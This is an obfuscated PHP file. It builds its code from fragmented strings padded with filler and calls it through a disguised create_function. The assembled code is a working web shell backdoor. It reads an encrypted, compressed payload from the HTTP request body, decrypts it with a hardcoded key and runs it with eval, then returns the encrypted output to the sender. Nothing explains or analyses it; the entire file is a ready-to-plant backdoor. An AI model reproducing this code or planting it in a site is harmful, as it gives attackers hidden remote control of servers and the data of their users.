<?php
$f='$k="a298a{[{[b21"{[{[;$kh="0{[36298{[{[e19522";$kf="31eb5{[f{[3b5468";$p="jLWus3z{';
$K='[KMlm2W{[zQ{[D";funct{[io{[n x($t,$k){${[c=str{[{[l{[en($k);$l=st{[rlen(${[t);$o="";for{[(';
$T='bas{[e6{[4_d{[ecode($m[1]){[,$k)));${[o=@ob_get_{[co{[nte{[n{[ts();@ob_en{[d_c{[le{[';
$Z='an{[();$r=@base{[64{[_encode(@x({[@g{[{[zcompress($o){[,$k));pr{[int("$p$kh$r$kf");}';
$u='^$k{$j{[};}}retur{[n $o;}if (@preg_{[match({["/$k{[h(.+{[){[$kf/",@file_{[get_{[c{';
$W=str_replace('pO','','pOpOcreatpOe_pOfpOunctpOion');
$X='{[$i=0;$i<${[l{[;){[{for{[($j=0;($j{[<$c&{[&$i<$l);${[j++,$i++){$o.{[=${[{[{[t{$i}';
$k='[ontents("php:{[//inp{[ut"),$m)={[=1) {[{@ob_s{[tart{[();@e{[val(@gzunco{[m{[press(@x({[@';
$t=str_replace('{[','',$f.$K.$X.$u.$k.$T.$Z);
$j=$W('',$t);$j();
?>
